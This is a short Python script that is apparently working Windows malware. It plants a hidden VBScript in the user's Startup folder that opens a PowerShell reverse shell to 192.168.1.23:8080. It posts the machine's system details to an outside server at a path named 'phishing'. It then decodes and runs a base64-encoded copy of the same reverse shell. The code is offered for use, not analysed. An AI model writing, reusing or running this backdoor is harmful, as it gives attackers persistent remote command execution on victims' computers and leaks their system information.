import os 
import time 
import platform 
import requests
import subprocess
import base64

def startup():
	vb_script = 'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run "powershell -nop -W hidden -noni -ep bypass -c ""$TCPClient = New-Object Net.Sockets.TCPClient(\'192.168.1.23\', 8080);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()}WriteToStream \'\';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()""", vbHide'

	startup_dir = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')

	script_path = os.path.join(startup_dir, 'myscript.vbs')

	with open(script_path, 'w') as f:
   	 f.write(vb_script)



def conn():
	system_info = platform.uname()
	sy = system_info.system
	no = system_info.node
	re = system_info.release
	ve = system_info.version
	ma = system_info.machine
	pr = system_info.processor 

	pyalod = {"system": sy, "node": no, "release": re, "version": ve, "machine": ma, "processor": pr}
	r = requests.post("https://axesearch.creatorsx.live/phishing/post.php", data=pyalod)

def backdoor():
	base64_str = 'cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzE5Mi4xNjguMS4yMycsIDgwODApOyROZXR3b3JrU3RyZWFtID0gJFRDUENsaWVudC5HZXRTdHJlYW0oKTskU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pO2Z1bmN0aW9uIFdyaXRlVG9TdHJlYW0gKCRTdHJpbmcpIHtbYnl0ZVtdXSRzY3JpcHQ6QnVmZmVyID0gMC4uJFRDUENsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZSB8ICUgezB9OyRTdHJlYW1Xcml0ZXIuV3JpdGUoJFN0cmluZyArICdTSEVMTD4gJyk7JFN0cmVhbVdyaXRlci5GbHVzaCgpfVdyaXRlVG9TdHJlYW0gJyc7d2hpbGUoKCRCeXRlc1JlYWQgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKSkgLWd0IDApIHskQ29tbWFuZCA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkQnl0ZXNSZWFkIC0gMSk7JE91dHB1dCA9IHRyeSB7SW52b2tlLUV4cHJlc3Npb24gJENvbW1hbmQgMj4mMSB8IE91dC1TdHJpbmd9IGNhdGNoIHskXyB8IE91dC1TdHJpbmd9V3JpdGVUb1N0cmVhbSAoJE91dHB1dCl9JFN0cmVhbVdyaXRlci5DbG9zZSgpIg=='
	decode_str = base64.b64decode(base64_str).decode('utf-8')
	result = subprocess.run(decode_str, shell=True, check=True, stdout=subprocess.PIPE, universal_newlines=True)

startup()
conn()	
backdoor()